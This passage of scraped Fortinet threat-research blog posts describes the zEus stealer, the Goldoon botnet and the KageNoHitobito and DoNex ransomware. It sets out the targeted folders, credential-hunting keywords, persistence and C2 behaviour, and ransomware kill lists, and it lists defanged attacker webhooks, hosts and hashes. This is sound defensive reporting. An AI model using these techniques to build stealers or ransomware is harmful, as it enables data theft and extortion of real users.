%localappdata%\\EpicGamesLauncher\\Saved\\Config%localappdata%\\EpicGamesLauncher\\Saved\\Data%localappdata%\\EpicGamesLauncher\\Saved\\Logs Telegram %appdata%\\Telegram Desktop\\tdataExclude strings: config, dumps, tdummy, emoji, user_data, webview, *.json Minecraft %userprofile%\\.lunarclient\\settings\\game\\*.json%appdata%\\.minecraft\\*.json Proton VPN %localappdata%\\protonvpn Ubisoft %localappdata%\\Ubisoft Game Launcher zEus stealer also drops KEYWORDSEARCHER.bat and Keyword.txt to the STEALER folder. The batch file helps users search for keywords they want in a folder, and the text file is its README. After data collection, the STEALER folder is compressed into a zip file—STEALER.zip—and deleted. KEYWORDSEARCHER.bat and Keyword.txt are not used by the zEus stealer. Finally, zEus organizes the attack result and sends it with STEALER.zip attached. The result shows whether it has successfully stolen the items that should be in the STEALER folder, along with the following information: Execution date, user name, computer name, processor, anti-virus software, clipboard content, installed XBOX games, cryptocurrencies, sensitive files zEus stealer also checks whether the victim uses any of the following cryptocurrencies: Zcash, Armory, Bytecoin, Jaxx, Exodus, Ethereum, AtomicWallet, Guarda, Coinomi It also searches the Downloads folder for files whose names contain one of the following keywords: 2fa, mdp, motdepasse, mot_de_passe, login, seed, key, data, db, password, secret, account, acount, paypal, banque, metamask, wallet, code, exodus, memo, compte, token, backup, recovery These keywords are related to login mechanisms, such as 2FA (two-factor authentication), seed, and key. There are also some French keywords meaning password, bank, and account. Apart from information stealing, there are features performed by the script files that are dropped to C:\\ProgramData\\{ComputerName}: Feature FileName Kill Task Manager debugerkiller.bat Send Screenshot Screen.bat Screen Lock SYSTEMLOCK.bat, configSYSLOCK.vbs, bsod.hta Chat Box CHATBOX.bat C2 Communication RAT.bat, COMMANDS.txt, HISTORY.txt Among these files, debugerkiller.bat, Screen.bat, and RAT.bat are executed immediately, and their paths are registered under HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run to achieve persistence. To avoid suspicion, the names of Windows system files and folders are used as the value name. zEus stealer drops debugerkiller.bat and obscures its execution to keep terminating Task Manager. This is set to auto-run to ensure the screen lock mechanism works. zEus drops Screen.bat to keep sending a screenshot to the webhook every five seconds. This is executed automatically at startup to keep monitoring the victim’s computer. SYSTEMLOCK.bat and configSYSLOCK.vbs are dropped to perform this task. configSYSLOCK.vbs is the launcher for SYSTEMLOCK.bat. The attacker can execute configSYSLOCK.vbs via C2 communication. SYSTEMLOCK.bat pops up a message box telling the victim not to restart the computer and closes explorer.exe to stop the victim from interacting with most Windows items. The SYSTEMLOCK.bat then keeps executing bsod.hta, which it dropped to the ProgramData folder. This HTA file just shows a full-screen blank window. However, debugkiller.bat prevents the victim from opening Task Manager, so most well-known methods to stop a program are blocked. CHATBOX.bat is dropped to allow the victim to send at most five sentences to the attacker. This can be executed via C2 communication. zEus stealer drops RAT.bat to build C2 communication. RAT.bat downloads command-line instructions from onlinecontroler[.]000webhostapp[.]com to COMMANDS.txt. If the instruction is not duplicated, it will be executed, and the result will be written to HISTORY.txt later. The executed instruction is sent to the attack’s webhook to show the current situation. In addition, special messages for screen lock and chat box help the attacker with troubleshooting. RAT.bat is set to auto-run to continuously control the computer. zEus stealer has a relatively simple attack flow, but it collects a wide variety of information that provides data for the next attack and contributes to social engineering. This is a reminder about the dangers of downloading and using files from an unknown source. Even a source pack, usually loaded by the software, can be a carrier for malware. In addition to only downloading files from reputable sources and checking reviews of a file and author, FortiGuard Labs recommends enabling MFA as an additional protection layer. MFA prevents unauthorized account access if a password has been compromised and can also alert users to unusual account activities. We also recommend subscribing to a service like FortiRecon that automatically scans the web for leaked data. The malware described in this report is detected and blocked by FortiGuard Antivirus as: BAT/Agent.DI!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each of these solutions. As a result, customers who have these products with up-to-date protections are protected. FortiGuard IP Reputation and Anti-Botnet Security services proactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. FortiRecon is a SaaS-based Digital Risk Prevention service backed by FortiGuard Labs cybersecurity experts. It scans the dark web to provide timely threat intelligence on threat actor activity, including leaked data, so organizations can respond rapidly to and shut down active threats. It can also detect evidence of attacks in progress and provide critical information about threat actor motivations and TTPs. If you believe this or any other cybersecurity threat has impacted your organization, please contact our Global FortiGuard Incident Response Team. onlinecontroler[.]000webhostapp[.]com/ panel-controller[.]000webhostapp[.]com/ hxxps[:]//discord[.]com/api/webhooks/1212818346157015070/2v0xe2vrxFGv65MRE9qvICmsJw-5e_pq_28xscGybiY1ScEyEiSKMC_zFffr3KkuAimX hxxps[:]//discord[.]com/api/webhooks/1212821302671581224/L30ylYucowXO_rm7sUpdwA8DLbYet6NyvUsNV60EP1o1HnF-2M-UPsvatVGQY0ctO9Vk hxxps[:]//discord[.]com/api/webhooks/1212818346157015070/2v0xe2vrxFGv65MRE9qvICmsJw-5e_pq_28xscGybiY1ScEyEiSKMC_zFffr3KkuAimX hxxps[:]//discord[.]com/api/webhooks/1212821302671581224/L30ylYucowXO_rm7sUpdwA8DLbYet6NyvUsNV60EP1o1HnF-2M-UPsvatVGQY0ctO9Vk hxxps[:]//discord[.]com/api/webhooks/1212818346157015070/2v0xe2vrxFGv65MRE9qvICmsJw-5e_pq_28xscGybiY1ScEyEiSKMC_zFffr3KkuAimX hxxps[:]//discord[.]com/api/webhooks/1216834085205311708/2Rx-yUIHeCnuhuLskpz25Ghf-YWeP6Si6oiUSN4SMQYNkeJfVJiYNC4Xy_Oj0ZNQ1qTC hxxps[:]//discord[.]com/api/webhooks/1117543783714787458/U_DdPjJm7rM7Q2asPiMISLTrbd3oGw3oVQ25_XU37HCmM6QIQ804SJAH4_h0AT2Vr_cv hxxps[:]//discord[.]com/api/webhooks/1191890861622050848/iJVVE3x3xilf4TeZNiERydXZPF5TRE1UhM4Ew06uHn95b0k0KDViw3YnhdynrXn17OKa hxxps[:]//discord[.]com/api/webhooks/1215746939635892344/CmKTGdIvizEpR4FgvvLJm3Bcbjg3AKlNGlwd2S-yIO-GRBXZZbn0OwG39kKnx7mDur4T hxxps[:]//discord[.]com/api/webhooks/1223978005127364659/3E0hHtDqDOHQJBaG8ifspilk2mY8E1s4KeQY36inBq-tq5q6aZex8U0YJVxVlloFJj5X hxxps[:]//discord[.]com/api/webhooks/1224075124005929020/kA4IFZrIXBl_d1Y4I0sMHhF1cZzXvC-yEo5HzSk6Jzq_I0k1PCc1idn4FmqSC2UMljdD aabfbef31ab073d99c01ecae697f66bbf6f14aa5d9c295c7a6a548879381fb24 c9687714cf799e5ce9083c9afa3e622c978136d339fc9c15e272b0df9cd7e21c d9d394cc2a743c0147f7c536cbb11d6ea070f2618a12e7cc0b15816307808b8a c2c8a7050b28d86143f4d606a6d245b53c588bc547a639094fce857962246da4 be9ea302bcfb52fbfdf006b2df8357388cd4c078059aabc5b5928676c3361e50 9d3409852348caa65d28e674008dd6bb986eed4fb507957c7a8b73a41e00be70 b6e8b612e99c54dd98af1756f7c9b8a8c19e31ed9b2836878c2a5144563ff1b2 8a2f6d5f6cf7d1a7534454e3c3007337b71d7da470e86f7636eb02d68b2db8cc df6156fdbbcc7b6f8c9cb4c5c1b0018fc3f1e1ca7d949b5538ec27dc86d026a4 5840f3e43a0c635be94b5fbf2e300d727545371b582361a52682b4a9e08bcebd 51ede75315d858209f9aa60d791c097c18d38f44b9d050b555ff1f4de0ae672d d1865d2aaf11e3f8bccefe9c4847510234f14aaa5378ce9e8e97553537cf2ca1 9ba19d614af029c3c198b576ccdf1de87d80ac14b12103e8a15376229a2a7860 6063c8285e13d10eabbe363e2ab0d8748bcd595b470698e0cffee31ba255a566 d1a18b436f947611914ced09e4465b49807cec4f3a62b0973c9017b6d82c9f70 1cdd580176eeb4342a0333b50454da061e473358274e6e543df1411186c12042 ed59a797521db06abdf4c88dad7b1666e5978aaa6670a5952a55b7e11f7b790e 2ceae724f0e96e2d8c47296dd1e73ac592e22ee3288eabf11c8d039c6d6d4f8b 03983b56d8b1a6cc43109f6cd67a13666367595a2ea07766127cb1fe4d4bb1a5 9940da9d02d29489c3e26d27feb15b6f4bbf49547b962592125441917c952f12 fbf967295dac00f1e9cb67e9a40b6729b003dd12cf022eb15d626df09716442d 4e0a96ab28570936d095ac3910dcd239c7ceeb2b38a070468404584f8b902dd1 20009fd157a898ad6d50fae6b8127056c5b1f50e31f90f01d2e6c13e6b4c38f8 info stealer malware FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/zeus-stealer-distributed-via-crafted-minecraft-source-pack"
  },
  {
    "title": "Key Findings from the 2H 2023 FortiGuard Labs Threat Report",
    "content": "FortiGuard Labs Threat Research In the second half of 2023, the cybersecurity landscape experienced various significant developments—like the rise in sophisticated attacks targeting large-scale enterprises and critical industries—that impact every organization. In our2H 2023 Threat Landscape Report, we examine the cyberthreat landscape over the year’s second half to identify trends and offer insights on what security professionals should know to effectively protect their organizations. The report findings are based on the collective intelligence ofFortiGuard Labs, drawn from Fortinet’s vast array of sensors collecting billions of threat events observed worldwide during this same period. Below are key takeaways from the report. During this period, we observed substantial activity among APT groups, more targeted ransomware attacks, new botnets and malware strains, and an uptick in IoT exploits. We’re seeing a continued trend of threat actors reusing “old” attacks, underscoring the importance of security practitioners remaining vigilant, as attackers aren’t likely to stop exploiting older vulnerabilities. Notably, adversaries are moving quicker than ever, exploiting new vulnerabilities 43% faster than in the first half of the year. This finding underscores the need for organizations to improve their patch management processes, ensuring that they’re updating software regularly to protect against fast-moving adversaries. Vendors also play a vital role in enabling customers to mitigate vulnerability risk. Every vendor has a responsibility to dedicate themselves to radical transparency, introducing robust security scrutiny at all stages of the product development lifecycle and proactively searching for and disclosing vulnerabilities. It’s no surprise that the threat of ransomware continues to keep security teams up at night. Across our sensors, ransomware detections surged 13 times higher over the first half of 2023. That was followed by a 70% drop during the latter half of the year, during which we also saw fewer organizations detecting ransomware variants. However, this shift isn’t a cause for celebration. In our2024 threat predictions report, we forecasted that adversaries looking for bigger payouts would turn their attention to critical sectors. This prediction came to fruition in 2H 2023: We witnessed a shift away from the traditional “spray and pray” ransomware strategy, with cybercriminals taking a more targeted approach and asking for higher ransom demands. Industrial organizations—including energy, healthcare, manufacturing, transportation, and automotive—experienced almost half (44%) of all ransomware and wiper detections in the second half of the year. Our FortiGuard Labs team monitors an array of globally deployed sensors that collect trillions of threat events worldwide each day. This unique vantage point gives us a detailed view of the threat landscape, including how exploit, malware, and botnet trends change. Exploitation activity captured by the FortiGuard Intrusion Prevention System (IPS) sensors running on our FortiGate Next-Generation Firewalls offers us visibility into how threat actors find vulnerabilities, exploit their targets, and build malicious infrastructure. Not surprisingly, IoT devices were popular targets, with attackers exploiting everything fromfirewallstoroutersduring the year’s second half. After threat actors find an exploitable vulnerability, their next step is often to deploy malware. Samples picked up by our various anti-malware solutions give us a better understanding of popular adversary tools, like JS/ScrInject and JS/Cryxos. Outside of these two consistently prevalent strains, four other malware families caught our attention in 2H 2023:AndroxGh0st,Apache ActiveMQransomware,Lazarus RATs, andAgent Tesla. Once infected with malware, systems often attempt to communicate with remote hosts to download additional payloads, establish command and control channels, and open backdoors into the environment. Botnet insights are vital to understanding the full scope of an attack. While we consistently see activity among Gh0st, Mirai, and ZeroAccess, we identified several new botnets to watch, including Prometei and DarkGate. In each threat landscape report, we aim to determine how long it takes for a vulnerability to move from initial release to exploitation and whether vulnerabilities with a highExploit Prediction Scoring System(EPSS) score are exploited faster. For the new exploits identified, attacks occurred an average of 4.76 days after discovery, which is 43% faster than the time-to-exploitation observed in 1H 2023. This underscores the need to use EPSS as an early warning system, as well as the importance of prioritizing patching efforts to mitigate the vulnerabilities most likely to be exploited. In 2022, we introduced the concept ofthe “red zone,”which helps security practitioners better understand how likely (or unlikely) it is that threat actors will exploit a specific vulnerability.We aim to help security teams prioritize their remediation efforts, focusing on the vulnerabilities that present the most significant risk. The good news is that only a fraction (<1%) of all published vulnerabilities were exploited in 2H 2023. However, when it comes to vulnerabilities, remember that what’s “old” is still new in the eyes of many attackers. We continue to see threat actors exploiting vulnerabilities over 15 years old, and nearly all organizations (98%) have detected exploits in their environments that have been in attackers’ toolboxes for at least five years. APT groups continue to be highly adaptable to changes in the digital landscape and are increasingly stealthy, carefully planning and executing their attacks. Based on intelligence from FortiRecon, we observed 38 of the 143 APT groups (27%) identified by MITRE as being active during the second half of the year. Of those, Lazarus Group, Kimusky, APT28, APT29, Andariel, and OilRig were the most active. While much of our telemetry shows us what actions attackers have taken previously, darknet intelligence helps us anticipate what adversaries may do next. In the last six months of 2023, threat actors discussed targeting organizations within the financial services industry most often, followed by the business services and education sectors. More than 20 significant zero days were shared on the dark web, and over 850,000 payment cards were advertised for sale. The most publicly active threat actors across the dark web were Valerka, Punktir, CoreLab, XXXX, and qwer. Disrupting cybercrime requires a culture of collaboration, transparency, and accountability on a larger scale than possible with each entity working independently. Cybersecurity vendors have a crucial role to play in this endeavor. Join us atRSA Conference 2024to learn more about the importance of driving responsible transparency across the industry during the session, “No More Secrets in Cybersecurity: Implementing Radical Transparency.” This discussion will feature renowned experts from organizations such as the Cyber Threat Alliance, the Cybersecurity and Infrastructure Security Agency (CISA), Fortinet, and the Former Undersecretary of the Department of Homeland Security. The latest Global Threat Landscape Report represents the collective intelligence of FortiGuard Labs, drawn from Fortinet’s vast array of sensors collecting billions of threat events observed worldwide during the second half of 2023. The FortiGuard Labs Global Threat Landscape Report uses the MITRE ATT&CK framework to describe how threat actors find vulnerabilities, build malicious infrastructure, and exploit their targets. The report covers global and regional perspectives. Download your copy of the2H 2023 FortiGuard Labs Threat Landscape Reportnow. Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/key-findings-2h-2023-fortiguard-labs-threat-report"
  },
  {
    "title": "New “Goldoon” Botnet Targeting D-Link Devices",
    "content": "FortiGuard Labs Threat Research Affected Platforms:D-Link DIR-645 Wired/Wireless Router Rev. Ax with firmware 1.04b12 and earlierImpacted Users:Any organizationImpact:Remote attackers gain control of the vulnerable systemsSeverity Level:High In April, FortiGuard Labs observed a new botnet targeting a D-Link vulnerability from nearly a decade ago, CVE-2015-2051. This vulnerability allows remote attackers to execute arbitrary commands via a GetDeviceSettings action on the HNAP interface. As a result, an attacker can create a crafted HTTP request with a malicious command embedded in the header. Our IPS signature captured attempts to exploit the CVE-2015-2051 vulnerability to propagate a new botnet that we have named “Goldoon.” Figure 1 shows the attack packet. If a targeted device is compromised, attackers can gain complete control, enabling them to extract system information, establish communication with a C2 server, and then use these devices to launch further attacks, such as distributed denial-of-service (DDoS). Our telemetry data also indicates that this botnet activity spiked in April, almost doubling the usual frequency. In this article, we will provide detailed insights into the propagation and actions of the Goldoon botnet. The attackers initially exploit CVE-2015-2051 to download a file “dropper” from “hxxp://94[.]228[.]168[.]60:8080.” The script is programmed to automatically download, execute, and clean up potentially malicious files across various Linux system architectures, including aarch64, arm, i686, m68k, mips64, mipsel, powerpc, s390x, sparc64, x86-64, sh4, riscv64, DEC Alpha, and PA-RISC. Each downloaded file, named “goldoon,” is executed immediately after its download and permission adjustment. After execution, the script removes the executed file and then deletes itself to erase any trace of its activity, thereby enhancing its stealth. The primary role of the “i686-linux-gnu” downloaded from the dropper is to get the botnet file. It first employs the XOR key, “YesItsAnAntiHoneypotBaby,” to decrypt the specific strings “linux” and “i686-linux-gnu.” After decoding, it attaches them to “/bins” to construct the full Uniform Resource Identifier (URI). It uses a fixed header, “User-Agent: FBI-Agent (Checking You),” to get the ultimate payload. Any attempt to open the targeted URI using a web browser will lead to the error message shown in Figure 7. Finally, it iterates through a set of paths, modifying each file it can write to and then deleting those files after modification. This is another cleanup mechanism to cover its tracks in a compromised system. Through analyzing the malware, we found that it has the following behaviors: Goldoon first initializes some required arguments for establishing a connection. For example, it uses “WolfSSL” for traffic encryption and sets the Google DNS server (i.e., “8.8.8.8”, “8.8.4.4”) as a DNS resolver. This allows the malware to carry through its attack. There are ten different autorun methods, each aiming to execute malware while the victim’s computer is starting up. We can classify them into the following types: Boot Execution, Daemon, and Logon Execution. The malware can execute itself through Linux booting initialize files or applications, such as “/etc/rc.local,” “crontab,” etc. Otherwise, it can be created as a daemon named “goldoon.server” and later enable itself to persist in the victim’s computer. In addition, the malware can also execute automatically as soon as the victim logs on to the compromised device. Autorun Type Autorun Method Boot Execution /etc/rc.local /etc/init.d/startup_script /etc/init.d/S99startup crontab /etc/profile Daemon /etc/systemd/system/goldoon.service /etc/inittab Logon Execution ~/.bashrc ~/.config/autostart/goldoon.desktop /etc/xdg/autostart/goldoon.desktop The Goldoon malware continuously tries to connect to its C2 server until a connection is established. It also records information about the targeted system, such as user name, etc. Once completed, the Goldoon malware receives packets from the C2 server. These contain commands for follow-up actions. The packet has seven cases that are set off by the C2 server. Two of them have obviously malicious purposes. One executes commands through “/bin/bash -c” on the victim host, and the other triggers different DoS attacks. According to our analysis, this malware contains an astounding 27 different methods related to various attacks. Protocol Attack Method ICMP ICMP Flooding TCP TCP Flooding, XMAS Attack, etc. UDP UDP Flooding DNS DNS Flooding HTTP HTTP Bypass, HTTP Flooding, etc. Other Minecraft DDoS Attack Table 2: Attack Methods Take a TCP SYN flooding attack as an example. The malware first gathers information about the target, such as its IP and port, and even checks whether the target IP is IPv6. Goldoon can launch DoS attacks through common protocols, including the game Minecraft. The malware uses various packets to launch a DoS attack, especially for attacks through TCP, which includes more than ten types of packets. Because some of these methods are empty, such as “http_exploit,” “http_xflow,” “http_pps,” and “http_cps,” we deduce that the attacker may have an ongoing development of the malware. While CVE-2015-2051 is not a new vulnerability and presents a low attack complexity, it has a critical security impact that can lead to remote code execution. Once attackers successfully exploit this vulnerability, they can incorporate compromised devices into their botnet to launch further attacks. FortiGuard Labs has identified one such new botnet, “Goldoon,” that is exploiting this vulnerability, reminding us that botnets continue to evolve and exploit as many devices as possible. We strongly recommend applying patches and updates whenever possible because of the ongoing development and introduction of new botnets. The malware described in this report is detected and blocked byFortiGuard Antivirusas: BAT/Agent.G!tr.dldrELF/Agent.JL!tr.dldrELF/Agent.GLN!trPOWERSHELL/Agent.G!tr.dldrW64/Agent.GLN!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each of these solutions. As a result, customers who have these products with up-to-date protections are protected. TheFortiGuard Web Filtering Serviceblocks the C2 server. FortiGuard Labs provides IPS signatures against attacks exploiting the following vulnerability: CVE-2015-2051: D-Link.Devices.HNAP.SOAPAction-Header.Command.Execution We also suggest that organizations go through Fortinet’sfree cybersecurity trainingmodule:Fortinet Certified Fundamentals. This module is designed to help end users learn how to identify and protect themselves from phishing attacks. FortiGuard IP Reputation and Anti-Botnet Security Serviceproactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact our GlobalFortiGuard Incident Response Team. 94[.]228[.]168[.]60 66f21251d7f8c58316f149fec104723beb979a1215ad4e788d83f0ee6fd34696712d9abe8fbdff71642a4d377ef920d66338d73388bfee542f657f2e916e219cd7367d41d19baa4f1022f8eb47f7ff1e13f583265c7c26ab96d5f716fa0d61eefdf6dae772f7003d0b7cdc55e047434dbd089e0dc7664a3fae8ccfd9d10ece8caa9e6006bce7d0b4554165dba76e67c4a44d98090c9e6ac9f3dca726f6e9adbffc44018b7432d9e6a1e98f723b0402101fa6e7483d098b10133aac142c0a4a0be7b78f16d0dfc91b4c7e8fd50fc31eba1eb22ec7030af9bf7c551b6019c793330e6eb17664943756cab434af5d94fcd341f154cb36fc6f1ef5eb5cfdce68975f9af8720766c5f3978718c026c2263801b08634443c93bd67022c56c6ef531ef3df71219ba6f5835309479b6e3eaca73b187f509b915420656bfe9a9cc32596c248130a7c09a5c92e15b3fc0d2e1eb655e0bd8f759e01ba849f7734e32dbc26528eb9c1eaecd0dcdd242e1bc8c62a1052915b627abe2de8ce147635fb7da3bfccb050a1ff0d205f392195179233493ff5b6f44adc93fe0dba1f78c4fe90ebcc46ffd2d3888b6b1289e380fa040247db6a4fbd2555db3e01fadd2fe41a0fa2debc88cea61218bdeea94537b74c67873e75b8ada6d050a30d311569c3118d161c46115e15fbee077a9e126cc0eb349445df34cc9404245520c702fadc5f75b6f859b10e47db989e29ace6c23ed15e29f313993f95e5e615711060881dfa84618071037331ab84a841b9d3cfb6f8797c1695e2dc0a2cdcc3f8f3c794dfaa50bcf0df5631980fab33525f4de1b47be606cd518403f54fa71b81186f02dbf7e9ed0004246142a5e3f3d3f84d8b38f98ff6897b03628e06e31016b8fafc9eb8c2b6201d3123a458a6346fd14c5bd7d41cda6c9c9bdabc786366a9ab3d5e7c00132ff83545bf2c9c6628d87a3cb85ee78ae3e92a09949185e6da11c41e2df04a53bb1274c81cfe4d3b98d0b28d3c3e7812beda005279bc6c67821b27571240eba440fa49 botnet FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/new-goldoon-botnet-targeting-d-link-devices"
  },
  {
    "title": "Ransomware Roundup - KageNoHitobito and DoNex",
    "content": "FortiGuard Labs Threat Research On a bi-weekly basis, FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This edition of the Ransomware Roundup covers the KageNoHitobito and DoNex ransomware. Affected platforms:Microsoft WindowsImpacted parties:Microsoft Windows UsersImpact:Steals and encrypts victims' files and demands ransom for file decryption and not releasing the stolen data.Severity level:High KageNoHitobito ransomware samples became available in late March 2024. As with most ransomware, this ransomware encrypts files on victims' machines and demands a ransom to decrypt them through dropped ransom notes. Although the group uses TOR to communicate with its victims, a data leak site is unavailable as it does not claim to have stolen any victims' information. Information on the infection vector used by the KageNoHitobito ransomware threat actor is unavailable. The KageNoHitobito ransomware samples were submitted to a publicly available file scanning service from several countries: Chile, China, Cuba, Germany, Iran, Lithuania, Peru, Romania, Sweden, Taiwan, the United Kingdom, and the United States. This suggests that the KageNoHitobito ransomware threat actor may have made the malware available on file-sharing services as fake software or game cheats and lured victims to these locations. The KageNoHitobito ransomware is designed to encrypt files only on the local drive, not on networked drives. The files encrypted by the ransomware have a “.hitobito” extension. It avoids encrypting files with the following file extensions: .dat .dll .exe .ini .log .sys The ransomware is designed not to continue if the current date of the compromised machine is 14 days after March 21, 2024. The ransomware displays a ransom note on the victim’s desktop and drops a text-based ransom note called \"KageNoHitobito_ReadMe.txt.\" KageNoHitobito is Japanese and can be translated as \"shadow people.\" We could not associate the term \"shadow people\" with any popular culture, including Japanese anime, to which some threat actors are fixated. The ransom note instructs victims to visit a TOR site that uses the AbleOnion chat platform and join a chat room. This site does not appear to be specific to the KageNoHitobito ransomware, as the ongoing group chat in both the designated chat room and the group chat at the time of our investigation is unrelated to ransom negotiations. DoNex is a relatively new, financially motivated ransomware group first reported in early March 2024. The file creation time of the samples is mid-February, so the ransomware may have been distributed prior to the date of the first report. All victims of the DoNex ransomware on the data leak site were added in February. Information about the infection vector used by the DoNex ransomware threat actor is unavailable. However, it is not likely to be significantly different from other ransomware groups. The DoNex ransomware’s data leak site on TOR listed five victims during our investigation. The organizations that were claimed to have been affected by the ransomware are located in Belgium, the Czech Republic, Italy, the Netherlands, and the United States. The actions of DoNex ransomware are dictated by a configuration file set by the threat actor. The DoNex ransomware encrypts files on both local drives and network shares, as <local_disks> and <network_shares> are set to true. The ransomware adds a victim ID as a file extension to the affected files and changes their file icons. According to the <while_extens> section in the configuration file, DoNex ransomware avoids encrypting files with the following extensions: 386 adv ani bat bin cab cmd com cpl cur deskthemepack diagcab diagcfg diagpkg dll drv exe hlp icl icns ico ics idx lnk mod mpa msc msp msstyles msu nls nomedia ocx prf ps1 rom rtp scr shs spl sys theme themepack wpx lock key hta msi pdb search-ms It also avoids encrypting the following files listed in <white_files>: bootmgr autorun.inf boot.ini bootfont.bin bootsect.bak desktop.ini iconcache.db ntldr ntuser.dat ntuser.dat.log ntuser.ini thumbs db GDIPFONTCACHEV1.DAT d3d9caps.dat The DoNex ransomware does not encrypt files in the following folders listed in <white_folders>: $recycle.bin config.msi $windows.~bt ;$windows.~ws windows boot program files program files (x86) programdata system volume information tor browser windows.old intel msocache perflogs x64dbg public all users default microsoft appdata It terminates the following processes listed in <kill_keep>: sql oracle mysq chrome veeam firefox excel msaccess onenote outlook powerpnt winword wuauclt It terminates the following services listed in <services>: vss sql svc$ memtas mepocs msexchange sophos veeam backup GxVss GxBlr GxFWD GxCVD GxCIMgr The ransomware is configured to delete shadow copies, making file recovery difficult. It then drops a ransom note labeled “Readme.[victim ID].txt} that demands contact via a TOR site, TOX chat, or email. Another ransomware, DarkRace, which appeared in mid-2023, uses a very similar ransom note and has the same configuration file, indicating that DoNex is possibly based on DarkRace and that the threat actor behind DoNex may be the same as DarkRace. During our research, the DoNex ransomware was operating a data leak site on TOR, which listed five victims in Europe and North America. Since no new victims have been added since February 27th, the threat actor has likely already ceased operations and moved on. The KageNoHitobito and DoNex/DarkRace ransomware described in this report are detected and blocked by FortiGuard Antivirus as: FortiGate, FortiMail, FortiClient, and FortiEDR support theFortiGuard AntiVirus service. The FortiGuard AntiVirus engine is a part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected. KageNoHitobito and DoNex/DarkRace Ransomware File IOCs SHA2 Note 8939bfe20bc6476806d22c8edfcaba5c36f936b893b3de1c847558502654c82f Hitobito ransomware 1940fcdb2561c2f7b82f6c44d22a9906e5ffec2438d5dadfe88d1608f5f03c33 506e8753dd5ca1c8387be32f26367e26f242b7c65e61203f7f926506c04163aa 8a10e0dc4994268ea33baecd5e89d1e2ddabef30afa09961257a4329669e857a bec9d2dcd9565bb245f5c8beca4db627390bcb4699dd5da192cc8aba895e0e6a 0adde4246aaa9fb3964d1d6cf3c29b1b13074015b250eb8e5591339f92e1e3ca DoNex ransomware 6d6134adfdf16c8ed9513aba40845b15bd314e085ef1d6bd20040afd42e36e40 b32ae94b32bcc5724d706421f915b7f7730c4fb20b04f5ab0ca830dc88dcce4e 74b5e2d90daaf96657e4d3d800bb20bf189bb2cf487479ea0facaf6182e0d1d3 DarkRace ransomware(predecessor of DoNex) 0e60d49a967599fab179f8c885d91db25016be996d66a4e00cbb197e5085efa4 Due to the ease of disruption, damage to daily operations, potential impact on an organization’s reputation, and the unwanted destruction or release of personally identifiable information (PII), etc., it is vital to keep all AV and IPS signatures up to date. Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREEFortinet Certified Fundamentals (FCF)in Cybersecurity training. The training is designed to help end users learn about today's threat landscape and will introduce basic cybersecurity concepts and technology. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. FortiReconis a SaaS based Digital Risk Prevention Service backed by cybersecurity experts to provide unrivaled threat intelligence on the latest threat actor activity across the dark web, providing a rich understanding of threat actors’ motivations and TTPs. The service can detect evidence of attacks in progress allowing customers to rapidly respond to and shut down active threats. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because the payment does not guarantee that files will be recovered. According to aUS Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. OurIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises). Additionally,FortiRecon Digital Risk Protection (DRP)is a SaaS-based service that provides a view of what adversaries are seeing, doing, and planning to help you counter attacks at the reconnaissance phase and significantly reduce the risk, time, and cost of later-stage threat mitigation. Ransomware Roundup FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/ransomware-roundup-keganohitobito-and-donex"
  },
  {
    "title": "Unraveling Cyber Threats: Insights from Code Analysis",
